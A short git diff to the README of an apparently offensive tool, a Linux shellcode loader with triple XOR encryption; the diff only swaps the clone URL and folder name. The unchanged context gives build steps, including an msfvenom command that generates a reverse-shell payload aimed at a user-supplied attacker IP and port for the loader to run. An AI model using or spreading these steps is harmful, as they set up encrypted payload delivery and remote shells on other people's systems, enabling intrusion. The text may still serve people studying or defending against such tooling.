@@ -10,8 +10,8 @@ A lightweight, modular shellcode loader for Linux with triple XOR encryption and
 
 ### 1. Clone & compile
 ```bash
-git clone https://github.com/yourusername/shellcode-loader.git
-cd shellcode-loader
+git clone https://github.com/Pwn3rx0/linux-loader.git
+cd linux-loader
 # replace shellcode.bin with your own
 msfvenom -p linux/x64/shell_reverse_tcp lhost=<ur-ip> lport=<ur-port> -f raw -o shellcode.bin
 make all
